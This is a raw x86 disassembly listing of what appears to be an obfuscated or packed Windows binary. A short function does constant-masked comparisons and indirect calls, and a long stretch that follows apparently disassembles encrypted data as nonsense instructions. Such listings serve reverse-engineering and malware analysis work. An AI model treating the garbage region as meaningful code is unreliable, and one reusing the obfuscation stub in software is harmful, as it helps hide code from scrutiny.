  402aa3:	call   0x40c40e
  402aa8:	mov    eax,DWORD PTR [ebp-0x24]
  402aab:	mov    eax,DWORD PTR [ebp-0xc]
  402aae:	mov    eax,DWORD PTR [ebp-0x8]
  402ab1:	mov    DWORD PTR [ebp+0xc],eax
  402ab4:	mov    eax,eax
  402ab6:	mov    eax,ds:0x42e313
  402abb:	mov    eax,DWORD PTR [eax+0x1c8]
  402ac1:	mov    eax,DWORD PTR [eax]
  402ac3:	cdq    
  402ac4:	mov    ebx,eax
  402ac6:	mov    eax,0xfabdbee9
  402acb:	add    ebx,eax
  402acd:	adc    edx,0xffffffff
  402ad0:	and    DWORD PTR [ebp-0x10],0x0
  402ad4:	xor    edx,0x0
  402ad7:	mov    DWORD PTR [ebp-0x6c],edx
  402ada:	mov    edx,DWORD PTR [ebp+0xc]
  402add:	mov    DWORD PTR [ebp-0x14],edx
  402ae0:	mov    ecx,0x8a29a12b
  402ae5:	xor    ebx,ecx
  402ae7:	add    DWORD PTR [ebp-0x14],eax
  402aea:	mov    edx,DWORD PTR [ebp-0x14]
  402aed:	adc    DWORD PTR [ebp-0x10],0xffffffff
  402af1:	xor    edx,ecx
  402af3:	mov    DWORD PTR [ebp-0x58],edx
  402af6:	mov    edx,DWORD PTR [ebp-0x10]
  402af9:	xor    edx,0x0
  402afc:	mov    DWORD PTR [ebp-0x54],edx
  402aff:	cmp    DWORD PTR [ebp-0x58],ebx
  402b02:	jne    0x402b14
  402b08:	mov    edx,DWORD PTR [ebp-0x6c]
  402b0b:	cmp    DWORD PTR [ebp-0x54],edx
  402b0e:	je     0x402b43
  402b14:	mov    edx,DWORD PTR ds:0x42e313
  402b1a:	mov    edx,DWORD PTR [edx+0x1c0]
  402b20:	mov    edx,DWORD PTR [edx]
  402b22:	xor    ebx,ebx
  402b24:	add    edx,eax
  402b26:	adc    ebx,0xffffffff
  402b29:	xor    edx,ecx
  402b2b:	xor    ebx,0x0
  402b2e:	cmp    edx,0x70941fc1
  402b34:	jne    0x402ba1
  402b3a:	cmp    ebx,0xffffffff
  402b3d:	jne    0x402ba1
  402b43:	mov    edx,DWORD PTR ds:0x42e38f
  402b49:	mov    ebx,DWORD PTR ds:0x42e397
  402b4f:	xor    edx,ebx
  402b51:	mov    DWORD PTR ds:0x42e38f,edx
  402b57:	mov    ebx,DWORD PTR ds:0x42e38f
  402b5d:	mov    edx,DWORD PTR [ebp-0x44]
  402b60:	add    DWORD PTR [edx],ebx
  402b62:	mov    edx,DWORD PTR [ebp+0xc]
  402b65:	xor    esi,edx
  402b67:	mov    edx,DWORD PTR ds:0x42e38f
  402b6d:	add    esi,edi
  402b6f:	xor    ebx,ebx
  402b71:	add    esi,eax
  402b73:	adc    ebx,0xffffffff
  402b76:	xor    edi,edi
  402b78:	xor    esi,ecx
  402b7a:	xor    ebx,0x0
  402b7d:	add    edx,eax
  402b7f:	adc    edi,0xffffffff
  402b82:	xor    edx,ecx
  402b84:	xor    edi,0x0
  402b87:	cmp    edx,esi
  402b89:	jne    0x402ba1
  402b8f:	cmp    edi,ebx
  402b91:	jne    0x402ba1
  402b97:	mov    eax,ds:0x42e38f
  402b9c:	mov    ds:0x42e397,eax
  402ba1:	mov    eax,ds:0x42e313
  402ba6:	push   0x4
  402ba8:	add    eax,0x1cc
  402bad:	push   eax
  402bae:	lea    eax,[ebp-0x24]
  402bb1:	push   eax
  402bb2:	call   0x402bd1
  402bb7:	mov    eax,DWORD PTR [ebp-0x24]
  402bba:	mov    eax,DWORD PTR [eax]
  402bbc:	pop    ebx
  402bbd:	pop    esi
  402bbe:	pop    edi
  402bbf:	leave  
  402bc0:	ret    0xc
  402bc3:	xor    eax,eax
  402bc5:	and    DWORD PTR ds:0x42901c,0x42d008
  402bcf:	inc    eax
  402bd0:	ret    
  402bd1:	push   ebp
  402bd2:	mov    ebp,esp
  402bd4:	sub    esp,0x10
  402bd7:	mov    eax,0xf89c85b9
  402bdc:	mov    DWORD PTR [ebp-0x4],eax
  402bdf:	sub    DWORD PTR ds:0x42c01c,ebx
  402be5:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  402bec:	mov    ecx,DWORD PTR [ebp-0x4]
  402bef:	mov    edx,DWORD PTR ds:0x42a010
  402bf5:	sbb    edx,DWORD PTR ds:0x42b014
  402bfb:	mov    DWORD PTR ds:0x42a010,edx
  402c01:	push   esi
  402c02:	adc    edx,DWORD PTR ds:0x42c014
  402c08:	mov    edx,0x7510899
  402c0d:	xor    ecx,edx
  402c0f:	mov    esi,0x3272e0
  402c14:	and    DWORD PTR ds:0x42a01c,0x483b
  402c1e:	push   edi
  402c1f:	or     DWORD PTR ds:0x42b018,ebx
  402c25:	mov    edi,DWORD PTR [ebp+0x10]
  402c28:	sbb    DWORD PTR ds:0x42c018,0x6469
  402c32:	add    ecx,esi
  402c34:	mov    DWORD PTR ds:0x42b00c,0x7c8c
  402c3e:	cmp    ecx,edi
  402c40:	mov    DWORD PTR ds:0x42900c,0x2470
  402c4a:	je     0x405144
  402c50:	and    DWORD PTR ds:0x42b000,0x0
  402c5a:	jmp    0x402c6c
  402c5f:	mov    edi,DWORD PTR ds:0x42b000
  402c65:	inc    edi
  402c66:	mov    DWORD PTR ds:0x42b000,edi
  402c6c:	cmp    DWORD PTR ds:0x42b000,0x1d
  402c73:	jae    0x402c9f
  402c79:	cmp    DWORD PTR ds:0x42b000,0x2c
  402c80:	jne    0x402c94
  402c86:	push   0x1
  402c88:	push   DWORD PTR [ebp-0x20]
  402c8b:	push   DWORD PTR [ebp-0x10]
  402c8e:	call   DWORD PTR ds:0x42ec77
  402c94:	jmp    0x402c5f
  402c99:	sub    edi,DWORD PTR ds:0x42c004
  402c9f:	mov    ecx,DWORD PTR [ebp-0x4]
  402ca2:	xor    DWORD PTR ds:0x42b018,0x2a2c
  402cac:	mov    edi,DWORD PTR [ebp+0x10]
  402caf:	jmp    0x405034
  402cb4:	inc    edi
  402cb5:	stos   BYTE PTR es:[edi],al
  402cb6:	pop    ss
  402cb7:	mov    edx,0x77b7a777
  402cbc:	mov    ebp,0x1deab7c
  402cc1:	and    eax,0x7a7a66a6
  402cc6:	jp     0x402d42
  402cc8:	add    bl,BYTE PTR [edi+0x7a]
  402ccb:	jp     0x402cde
  402ccd:	sub    BYTE PTR [edi],dl
  402ccf:	cmp    eax,0x2f1b2115
  402cd4:	popa   
  402cd5:	cmp    ah,BYTE PTR [ebp+0x66]
  402cd8:	xor    al,0x60
  402cda:	push   0x6a
  402cdc:	imul   esi,DWORD PTR [edx],0x6cfdd8c1
  402ce2:	inc    esp
  402ce3:	imul   edi,DWORD PTR [ebp+0x5b],0xffffffac
  402ce7:	jl     0x402d52
  402ce9:	push   ebp
  402cea:	iret   
  402ceb:	pop    ecx
  402cec:	dec    edx
  402ced:	cmp    al,0x88
  402cef:	cli    
  402cf0:	xchg   DWORD PTR [esi+0x57],esi
  402cf3:	dec    ecx
  402cf4:	jg     0x402d2d
  402cf6:	mov    WORD PTR [esi+0x3ba2bc7f],fs
  402cfc:	sub    bh,bh
  402cfe:	data16 fdivr st,st(2)
  402d01:	push   ebx
  402d02:	jg     0x402d22
  402d04:	jmp    0xe9faf63e
  402d09:	xchg   DWORD PTR [ebx],edx
  402d0b:	fimul  WORD PTR [ebx-0x54aaf0db]
  402d11:	mov    al,al
  402d13:	imul   DWORD PTR [ecx-0x27]
  402d16:	add    al,dl
  402d18:	push   cs
  402d19:	cli    
  402d1a:	es adc al,0x44
  402d1d:	or     BYTE PTR [esi],ah
  402d1f:	imul   esp,DWORD PTR [ebp+esi*4-0x51],0x13
  402d24:	pop    ebp
  402d25:	add    DWORD PTR [esi+0x2b45e5ff],esp
  402d2b:	jo     0x402d5f
  402d2d:	les    ebx,FWORD PTR [ebx-0xb]
  402d30:	sbb    bh,dl
  402d32:	je     0x402cf1
  402d34:	arpl   cx,bx
  402d36:	xchg   esp,eax
  402d37:	pop    edi
  402d38:	mov    edi,DWORD PTR [ebp+0x4d821007]
  402d3e:	repz sahf 
  402d40:	cmp    BYTE PTR [edx+0x73],dh
  402d43:	or     ebx,edx
  402d45:	sub    DWORD PTR [edx-0x77],edx
  402d48:	xor    BYTE PTR [ebx],dh
  402d4a:	push   eax
  402d4b:	jecxz  0x402d1c
  402d4d:	mov    ah,BYTE PTR ds:0xc8b7cc85
  402d53:	test   BYTE PTR [ebp-0x20],ch
  402d56:	inc    ecx
  402d57:	push   edx
  402d58:	dec    eax
  402d59:	or     BYTE PTR [esi],bh
  402d5b:	repz add ebp,DWORD PTR ss:[ecx+0x4ca7ca4b]
  402d63:	fadd   QWORD PTR [eax]
  402d65:	push   esi
  402d66:	stc    
  402d67:	push   edx
  402d68:	push   esi
  402d69:	mov    eax,ds:0xf4bf64f5
  402d6e:	inc    edx
  402d6f:	push   ss
  402d70:	add    DWORD PTR [eax+esi*1-0x31],edi
  402d74:	pop    es
  402d75:	fbld   TBYTE PTR [edi+0x10]
  402d78:	(bad)  
  402d7a:	rcr    BYTE PTR [edx+0x25],0xe2
  402d7e:	sub    edx,DWORD PTR [edi+0x5e349f17]
  402d84:	into   
  402d85:	fwait
  402d86:	sub    dl,BYTE PTR [ebx+0xe09daa8]
  402d8c:	xchg   esi,eax
  402d8d:	add    al,0xcc
  402d8f:	add    eax,0xbe4c0b2c
  402d94:	inc    DWORD PTR [ebx+edi*4+0x1c476369]
  402d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9c:	ja     0x402d2e
  402d9e:	dec    ebx
  402d9f:	scas   eax,DWORD PTR es:[edi]
  402da0:	sub    al,0xd8
  402da2:	jno    0x402d93
  402da4:	repnz mov dl,0x4e
  402da7:	jge    0x402d87
  402da9:	(bad)  
  402daa:	mov    ds:0x24f3c8de,eax
  402daf:	loopne 0x402d69
  402db1:	imul   esp,DWORD PTR [ebp-0x1f746983],0xa31f959c
  402dbb:	xor    ch,al
  402dbd:	inc    ebp
  402dbe:	adc    edi,DWORD PTR ss:[ebx-0x5542adb2]
  402dc5:	(bad)  
  402dc6:	retf   0xb243
  402dc9:	jne    0x402ddf
  402dcb:	ins    BYTE PTR es:[edi],dx
  402dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dcd:	push   esp
  402dce:	ds adc bh,dl
  402dd1:	sub    eax,0xaae46177
  402dd6:	mov    bh,dh
  402dd8:	lods   al,BYTE PTR ds:[esi]
  402dd9:	(bad)  
  402ddb:	jnp    0x402e43
  402ddd:	push   ds
  402dde:	pushf  
  402ddf:	dec    ebx
  402de0:	mov    ebx,0x3650d025
  402de5:	push   ds
  402de6:	out    dx,al
  402de7:	into   
  402de8:	out    0x9b,eax
  402dea:	xlat   BYTE PTR ds:[ebx]
  402deb:	xor    DWORD PTR [eax-0xfc883ae],edi
  402df1:	rcl    DWORD PTR [ebx],0x13
  402df4:	rol    BYTE PTR [ebx-0x57],0xd5
  402df8:	jnp    0x402e19
  402dfa:	xchg   esp,eax
  402dfb:	ret    0xf9d9
  402dfe:	mov    ecx,0xc05bcb89
  402e03:	sub    BYTE PTR [edx+0x2702a41b],bl
  402e09:	mov    ds:0xa72a60a9,eax
  402e0e:	repz push 0x10
  402e11:	scas   al,BYTE PTR es:[edi]
  402e12:	in     eax,dx
  402e13:	mov    eax,0x12e7a58b
  402e18:	mov    ebx,0x408e6a57
  402e1d:	std    
  402e1e:	in     al,dx
  402e1f:	jb     0x402dd7
  402e21:	loopne 0x402db0
  402e23:	dec    esi
  402e24:	mov    esi,0x8342b1f8
  402e29:	pop    edx
  402e2a:	scas   eax,DWORD PTR es:[edi]
  402e2b:	data16 cli 
  402e2d:	pop    ebx
  402e2f:	inc    ebp
  402e30:	fs jmp 0x1708:0x7d86cd96
  402e38:	(bad)  
  402e39:	ds xor esi,0x6f8ecb9
  402e40:	loop   0x402e90
  402e42:	mov    ch,BYTE PTR [eax]
  402e44:	in     eax,0x3
  402e46:	add    ecx,DWORD PTR [ebx-0x7b]
  402e49:	test   al,0x25
  402e4b:	or     al,0x5e
  402e4d:	sub    eax,0xc3968cd8
  402e52:	jmp    0x402ec0
  402e54:	xchg   esi,eax
  402e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e56:	jmp    DWORD PTR [edx]
  402e58:	adc    al,0xcc
  402e5a:	mov    esp,0xadfa5c07
  402e5f:	dec    edi
  402e60:	imul   ebx,DWORD PTR [edi+0x3f],0xffffff85
  402e64:	xor    eax,0x7b235233
  402e69:	cli    
  402e6a:	fdivr  DWORD PTR [ebx+0x4f]
  402e6d:	sbb    bh,dh
  402e6f:	mov    al,0xcf
  402e71:	jo     0x402ebc
  402e73:	push   ebx
  402e74:	or     esp,edx
  402e76:	dec    ebp
  402e77:	call   0x5d55:0x456bf8ba
  402e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e7f:	inc    BYTE PTR [ebx]
  402e81:	and    al,BYTE PTR [edx-0x48055f52]
  402e87:	inc    DWORD PTR fs:[esi+0x12]
  402e8b:	add    esp,eax
  402e8d:	cld    
  402e8e:	pop    es
  402e8f:	pop    ebx
  402e90:	(bad)  
  402e91:	fcomp  DWORD PTR [ebp+0x51]
  402e94:	inc    ebx
  402e95:	add    eax,0xee86d681
  402e9a:	pop    ds
  402e9b:	cmp    BYTE PTR [eax],ch
  402e9d:	aas    
  402e9e:	out    dx,eax
  402e9f:	fs add ch,dl
  402ea2:	in     eax,0x99
  402ea4:	sbb    al,ah
  402ea6:	frstor [edi*2+0x6b5655fa]
  402ead:	lods   al,BYTE PTR ds:[esi]
  402eae:	(bad)  
  402eaf:	xor    bl,BYTE PTR [ebx-0x2b]
  402eb2:	out    0xe6,al
  402eb4:	xor    edi,edi
  402eb6:	repz jp 0x402e7a
  402eb9:	std    
  402eba:	std    
  402ebb:	sbb    al,0xba
  402ebd:	fidiv  WORD PTR [eax]
  402ebf:	push   0x9303be5a
  402ec4:	jbe    0x402f45
  402ec6:	mov    edx,0xbeb392a8
  402ecb:	js     0x402eca
  402ecd:	inc    esi
  402ece:	ja     0x402e9e
  402ed0:	aam    0x31
  402ed2:	sahf   
  402ed3:	inc    ebx
  402ed4:	aam    0x3c
  402ed6:	jmp    0xeea20068
  402edb:	js     0x402e75
  402edd:	je     0x402f44
  402edf:	lahf   
  402ee0:	fsub   st(6),st
  402ee2:	bound  esi,QWORD PTR [ebx]
  402ee4:	leave  
  402ee5:	dec    edx
  402ee6:	(bad)  
  402ee8:	test   eax,0x639516f5
  402eed:	xor    al,0x4
  402eef:	in     al,0xa9
  402ef1:	test   DWORD PTR [edi],esi
  402ef3:	and    edx,0x7f
  402ef6:	push   0x17
  402ef8:	add    esp,DWORD PTR ds:0x5f5301d5
  402efe:	sbb    BYTE PTR ds:0xedbdbdc4,cl
  402f04:	dec    edi
  402f05:	adc    ecx,0x27
  402f08:	nop
  402f09:	(bad)  
  402f0a:	in     eax,dx
  402f0b:	in     eax,dx
  402f0c:	and    eax,0x73ebfe48
  402f11:	push   ebp
  402f12:	scas   eax,DWORD PTR es:[edi]
  402f13:	ds jl  0x402f8d
  402f16:	sbb    ch,cl
  402f18:	push   esp
  402f19:	mov    esp,0xac9cae94
  402f1e:	and    ebp,DWORD PTR [eax-0x3b6bc677]
  402f24:	pop    ebp
  402f25:	pop    esp
  402f26:	mov    cl,0x6e
  402f28:	pop    esp
  402f29:	aaa    
  402f2a:	mov    dl,0xe2
  402f2c:	jge    0x402f8d
  402f2e:	ror    BYTE PTR [ebx],cl
  402f30:	dec    esi
  402f31:	ss push ecx
  402f33:	loopne 0x402f93
  402f35:	into   
  402f36:	call   0x921:0x77b0b160
  402f3d:	pop    ebp
  402f3e:	push   esp
  402f3f:	fisttp WORD PTR [eax]
  402f41:	movd   mm5,eax
  402f44:	in     eax,dx
  402f45:	jno    0x402ef4
  402f47:	xor    esp,DWORD PTR [esi+eiz*8+0x2b]
  402f4b:	push   esp
  402f4c:	std    
  402f4d:	jecxz  0x402fc5
  402f4f:	mov    eax,0xb89d8c7c
  402f54:	in     eax,dx
  402f55:	sti    
  402f56:	sbb    eax,DWORD PTR [eax-0x50]
  402f59:	adc    al,0x31
  402f5b:	pop    ecx
  402f5c:	aad    0x3
  402f5e:	or     eax,0x54708aa0
  402f63:	out    0xc8,al
  402f65:	push   esp
  402f66:	loopne 0x402fcd
  402f68:	mov    eax,0x4cb5595d
  402f6d:	fwait
  402f6e:	xchg   esi,eax
  402f6f:	push   edx
  402f70:	fidivr WORD PTR [eax+edx*4+0x434e035b]
  402f77:	pushf  
  402f78:	jle    0x402fa3
  402f7a:	jmp    0x402f4d
  402f7c:	imul   edx,DWORD PTR [ecx+0x14ccbe7],0x4a
  402f83:	jmp    0x60fed522
  402f88:	fild   DWORD PTR [ebx*4-0x2a66cd60]
  402f8f:	cdq    
  402f90:	mov    dl,dl
  402f92:	xor    ch,BYTE PTR [eax]
  402f94:	mov    ecx,0xa49b578a
  402f99:	test   al,0x2c
  402f9b:	mov    ebx,0x2703c5f
  402fa0:	stos   BYTE PTR es:[edi],al
  402fa1:	jecxz  0x402fef
  402fa3:	mov    bh,0x46
  402fa5:	ret    
  402fa6:	aam    0xbb
  402fa8:	xlat   BYTE PTR ds:[ebx]
  402fa9:	jp     0x403014
  402fab:	shl    DWORD PTR [ebx],0x8b
  402fae:	sub    dh,BYTE PTR [eax]
  402fb0:	lods   eax,DWORD PTR ds:[esi]
  402fb1:	jl     0x40301a
  402fb3:	cmp    eax,0xf1b127bc
  402fb8:	sbb    BYTE PTR [edi-0x48],0xb8
  402fbc:	mov    ah,0xfe
  402fbe:	pushf  
  402fbf:	add    eax,0x4c41d22d
  402fc4:	test   DWORD PTR [esp+eax*1],eax
  402fc7:	inc    ebx
  402fc8:	mov    dl,0x54
  402fca:	xchg   edi,eax
  402fcb:	pop    edi
  402fcc:	xchg   esi,eax
  402fcd:	inc    esi
  402fce:	xchg   ecx,eax
  402fcf:	mov    edx,0xa6e55918
  402fd4:	lds    ebp,FWORD PTR [ebp-0x36f0e7e]
  402fda:	dec    esp
  402fdb:	sahf   
  402fdc:	call   0x79e5:0xcbc40723
  402fe3:	jnp    0x403056
  402fe5:	cmp    DWORD PTR [edi-0x29],0x20e7d712
  402fec:	adc    DWORD PTR gs:[ecx],esp
  402fef:	shl    ebx,1
  402ff1:	or     dh,al
  402ff3:	fist   DWORD PTR [edx-0x49]
  402ff6:	shr    DWORD PTR [esi-0x62],0x75
  402ffa:	std    
  402ffb:	mov    ch,0xfc
  402ffd:	xchg   esi,eax
  402ffe:	xor    dh,bl
  403000:	call   0xa11ef87b
  403005:	es cwde 
  403007:	jle    0x40301e
  403009:	fdiv   QWORD PTR [ebp+ebp*4-0x60bb1541]
  403010:	inc    ecx
  403011:	mov    bl,0x60
  403013:	ins    DWORD PTR es:[edi],dx
  403014:	add    al,0x2b
  403016:	scas   al,BYTE PTR es:[edi]
  403017:	repnz mov ah,0x95
  40301a:	push   ecx
  40301b:	rcl    DWORD PTR [ebx+0x69d248a8],0xfb
  403022:	pop    edx
  403023:	push   esp
  403024:	ins    BYTE PTR es:[edi],dx
  403025:	jecxz  0x402fbc
  403027:	stos   BYTE PTR es:[edi],al
  403028:	xor    ebx,esi
  40302a:	clc    
  40302b:	test   DWORD PTR [edi-0x2e],eax
  40302e:	stos   DWORD PTR es:[edi],eax
  40302f:	out    dx,eax
  403030:	adc    BYTE PTR [edi],cl
  403032:	xchg   DWORD PTR [eax-0x74],esp
  403035:	and    DWORD PTR [esi+0x70],edx
  403038:	loopne 0x4030b8
  40303a:	jg     0x403091
  40303c:	mov    al,cl
  40303e:	push   es
  40303f:	xor    al,0x6d
  403041:	xor    DWORD PTR [ebx+0x5a3cf6af],esp
  403047:	iret   
  403048:	sub    bl,dl
  40304a:	mov    cl,0xcd
  40304c:	in     al,dx
  40304d:	push   eax
  40304e:	mov    ds:0x36edac50,eax
  403053:	not    BYTE PTR [edi]
  403055:	jb     0x40305e
  403057:	mov    bh,0x75
  403059:	mov    ds:0x4aee32a9,al
  40305e:	add    al,0x43
  403060:	scas   eax,DWORD PTR es:[edi]
  403061:	sub    DWORD PTR [ecx+eax*4],ebp
  403064:	(bad)
  403067:	les    esp,FWORD PTR [ebp-0x28]
  40306a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40306b:	sahf   
  40306c:	mov    al,0x5b
  40306e:	sbb    DWORD PTR [edi],0x2ef647c0
  403074:	mov    ds:0xf1c31aa6,eax
  403079:	sub    BYTE PTR [edx+0x2e],bl
  40307c:	enter  0x1460,0x7
  403080:	cmp    DWORD PTR [edi+0x34],ebx
  403083:	push   ecx
  403084:	add    dl,BYTE PTR [edi]
  403086:	push   esp
  403087:	loope  0x4030c8
  403089:	int    0x12
  40308b:	pop    edx
  40308c:	mov    dh,0xcd
  40308e:	fsubr  QWORD PTR [esi]
  403090:	nop
  403091:	icebp  
  403092:	inc    ecx
  403093:	lods   al,BYTE PTR ds:[esi]
  403094:	les    edx,FWORD PTR [ecx+0x6c]
  403097:	pusha  
  403098:	jecxz  0x403067
  40309a:	xor    ebp,eax
  40309c:	dec    ebx
  40309d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40309e:	push   esp
  40309f:	sub    bh,dl
  4030a1:	jecxz  0x4030ca
  4030a3:	push   eax
  4030a4:	in     al,0xcb
  4030a6:	das    
  4030a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030a8:	fbld   TBYTE PTR [ebx]
  4030aa:	push   0x71
  4030ac:	jnp    0x4030f9
  4030ae:	je     0x403129
  4030b0:	pushf  
  4030b1:	or     eax,ebp
  4030b3:	in     ax,dx
  4030b5:	int3   
  4030b6:	jle    0x40309d
  4030b8:	stc    
  4030b9:	pop    eax
  4030ba:	in     al,0x8f
  4030bc:	push   ds
  4030bd:	pop    ebp
  4030be:	jmp    0x4030b8
  4030c0:	fsub   QWORD PTR [ebp-0x3a]
  4030c3:	push   es
  4030c4:	mov    dl,0xa0
  4030c6:	xor    esp,esi
  4030c8:	sar    DWORD PTR [ebx],1
  4030ca:	cmp    esi,0xfffffff4
  4030cd:	mov    eax,DWORD PTR [esi+0x1c]
  4030d0:	xor    eax,0x3ea8a9dc
  4030d5:	and    BYTE PTR ds:0xb17cc090,al
  4030db:	(bad)
  4030de:	push   edi
  4030df:	ja     0x4030f3
  4030e1:	in     eax,0xa0
  4030e3:	jb     0x403082
  4030e5:	jge    0x4030f4
  4030e7:	sbb    eax,0xdf7d0856
  4030ec:	call   0xcb84:0xb70cdbd9
  4030f3:	lock retf 0xdca3
  4030f7:	or     eax,0x162f8186
  4030fc:	lods   eax,DWORD PTR ds:[esi]
  4030fd:	jp     0x4030b6
  4030ff:	mov    dl,0xa8
  403101:	push   eax
  403102:	sbb    bh,BYTE PTR [ebx-0x58b092a9]
  403108:	xor    dl,BYTE PTR [ebp-0x578a64c9]
  40310e:	lods   al,BYTE PTR ds:[esi]
  40310f:	dec    esi
  403110:	and    cl,dl
  403112:	je     0x403103
  403114:	xlat   BYTE PTR ds:[ebx]
  403115:	out    dx,al
  403116:	jge    0x403185
  403118:	ja     0x403187
  40311a:	cmc    
  40311b:	mov    al,BYTE PTR [eax-0x671646cb]
  403121:	mov    edi,0x773fa9fb
  403126:	add    eax,0xe0f2c7e5
  40312b:	jl     0x4031ac
  40312d:	inc    esp
  40312e:	retf   
  40312f:	add    al,0x31
  403131:	imul   ebp,edi,0xa5f406e7
  403137:	test   al,0xb2
  403139:	(bad)  
  40313a:	mul    esp
  40313c:	repz and al,0x80
  40313f:	mov    esi,0xfb88d51f
  403144:	bound  edi,QWORD PTR [eax]
  403146:	push   esi
  403147:	das    
  403148:	xchg   BYTE PTR [ecx-0x4e],cl
  40314b:	adc    al,bh
  40314d:	push   edi
  40314e:	mov    ah,0x8
  403150:	push   ecx
  403151:	dec    esi
  403152:	push   es
  403153:	sub    eax,0x3d30f39b
  403158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403159:	xor    dl,bh
  40315b:	pop    ebp
  40315c:	add    eax,0xe5d9660a
  403161:	push   eax
  403162:	je     0x4031df
  403164:	sub    al,0x51
  403166:	adc    eax,0x3d9dfa6a
  40316b:	jae    0x403177
  40316d:	mov    eax,0xd89c9c7
  403172:	mov    ebp,0x286a875
  403177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403178:	xchg   esp,eax
  403179:	jecxz  0x4031be
  40317b:	dec    esp
  40317c:	imul   esp,DWORD PTR [edx],0x92926974
  403182:	in     eax,0x28
  403184:	(bad)  
  403185:	pop    ss
  403186:	iret   
  403187:	iret   
  403188:	pop    edx
  403189:	in     al,0x26
  40318b:	add    eax,edi
  40318d:	adc    eax,0x84c8015c
  403192:	push   edx
  403193:	jecxz  0x4031f9
  403195:	xor    ah,dl
  403197:	fwait
  403198:	arpl   WORD PTR [ecx],sp
  40319a:	sti    
  40319b:	mov    eax,ds:0x73fe0c27
  4031a0:	ret    0x184a
  4031a3:	mov    dl,0x11
  4031a5:	out    dx,eax
  4031a6:	cmp    DWORD PTR ds:0x244e0542,edx
  4031ac:	and    eax,0x8b380a3
  4031b1:	push   edx
  4031b2:	xchg   ebp,eax
  4031b3:	mov    ah,0x3b
  4031b5:	fwait
  4031b6:	pop    eax
  4031b7:	inc    edi
  4031b8:	inc    esp
  4031b9:	add    ch,BYTE PTR [edx-0x63627dc1]
  4031bf:	daa    
  4031c0:	jmp    0xbdf34f10
  4031c5:	js     0x403158
  4031c7:	and    BYTE PTR [ebx],dh
  4031c9:	add    DWORD PTR [ecx],edi
  4031cb:	outs   dx,DWORD PTR ds:[esi]
  4031cc:	scas   al,BYTE PTR es:[edi]
  4031cd:	dec    edx
  4031ce:	cmp    BYTE PTR ds:0xda01c010,bh
  4031d4:	(bad)  
  4031d5:	in     eax,dx
  4031d6:	lds    ebp,FWORD PTR [ecx+0x11a3d3c5]
  4031dc:	pop    edx
  4031dd:	fstp   DWORD PTR [edi-0x43e31396]
  4031e3:	push   ds
  4031e4:	clc    
  4031e5:	sbb    ebx,DWORD PTR ds:0xa29e0219
  4031eb:	ds jnp 0x403224
  4031ee:	xlat   BYTE PTR ds:[ebx]
  4031ef:	retf   0xd503
  4031f2:	mul    DWORD PTR [edi+0x2a]
  4031f5:	pop    ebx
  4031f6:	push   DWORD PTR [edx]
  4031f8:	lds    ebx,FWORD PTR [bx-0xc]
  4031fc:	ja     0x4031ae
  4031fe:	xor    DWORD PTR [ebx-0x48270fe0],edx
  403204:	dec    ecx
  403205:	inc    edx
  403206:	in     al,0x37
  403208:	push   0x30
  40320a:	div    esi
  40320c:	mov    edx,0xef262e0c
  403211:	scas   al,BYTE PTR es:[edi]
  403212:	outs   dx,DWORD PTR ds:[esi]
  403213:	push   ds
  403214:	loop   0x4031ab
  403216:	and    eax,0xd4eb567a
  40321b:	sub    edi,DWORD PTR [eax]
  40321d:	inc    ebp
  40321e:	bnd jmp ebx
  403221:	push   cs
  403222:	or     ebx,eax
  403224:	push   esi
  403225:	xor    ebp,DWORD PTR [eax]
  403227:	add    dh,BYTE PTR [edi+0x3c2ce8f0]
  40322d:	inc    ecx
  40322e:	sar    BYTE PTR [ebx-0x65b686e7],0x50
  403235:	xor    ch,bl
  403237:	pop    ds
  403238:	lds    edx,FWORD PTR [esi]
  40323a:	imul   esp,DWORD PTR [ecx+0x73b3ef81],0xffffffb4
  403241:	repz imul esp,DWORD PTR [ecx],0x66576f38
  403248:	in     al,dx
  403249:	int3   
  40324a:	sbb    DWORD PTR [ecx+0x58],edx
  40324d:	fbld   TBYTE PTR [edx-0x381b1be5]
  403253:	fstp   QWORD PTR [ecx*2-0x3b15591c]
  40325a:	and    ch,BYTE PTR [ebp-0x2a412be8]
  403260:	call   0x7020:0xb70f13ba
  403267:	jle    0x40320e
  403269:	xor    BYTE PTR [edi+0x5b02f819],dl
  40326f:	sbb    ch,al
  403271:	sub    ecx,DWORD PTR [esi-0x35]
  403274:	push   edx
  403275:	xor    bl,BYTE PTR [ebx+ebx*4+0x713284c9]
  40327c:	push   ebp
  40327d:	in     eax,dx
  40327e:	xor    al,0x3f
  403280:	mov    ecx,0xd0120a16
  403285:	fst    QWORD PTR ds:0xdd04f0ad
  40328b:	push   0xc923f17d
  403290:	mov    cl,0xc4
  403292:	mov    ecx,0x3c0cadf4
  403297:	aam    0x16
  403299:	rol    DWORD PTR [edi+0x1d],0x61
  40329d:	pop    edx
  40329f:	mov    ah,0x5a
  4032a1:	cld    
  4032a2:	cwde   
  4032a3:	data16 test BYTE PTR [edi+edx*2],0x19
  4032a8:	mov    esp,0x656ac633
  4032ad:	cmc    
  4032ae:	and    DWORD PTR [ebx+0x1],ecx
  4032b1:	test   eax,0xe528b23a
  4032b6:	fadd   QWORD PTR [edx]
  4032b8:	ror    DWORD PTR [ecx+0x1bc92824],cl
  4032be:	push   ebx
  4032bf:	sub    DWORD PTR es:[ecx],ecx
  4032c2:	arpl   WORD PTR [ecx-0x3359ca8d],sp
  4032c8:	aas    
  4032c9:	mov    ecx,0x1c5e21bc
  4032ce:	jge    0x4032a3
  4032d0:	stc    
  4032d1:	xor    DWORD PTR [ebx+0x66ccdca0],ebx
  4032d7:	dec    ebx
  4032d8:	xlat   BYTE PTR ds:[ebx]
  4032d9:	xchg   DWORD PTR [ecx-0x4132d641],eax
  4032df:	lea    ecx,[edx]
  4032e1:	mov    ecx,ebp
  4032e3:	rcl    DWORD PTR [edx-0x3c8bcd1],0xf8
  4032ea:	dec    esp
  4032eb:	jno    0x403331
  4032ed:	inc    eax
  4032ee:	xchg   ebx,eax
  4032ef:	inc    esp
  4032f0:	jbe    0x403293
  4032f2:	pop    ss
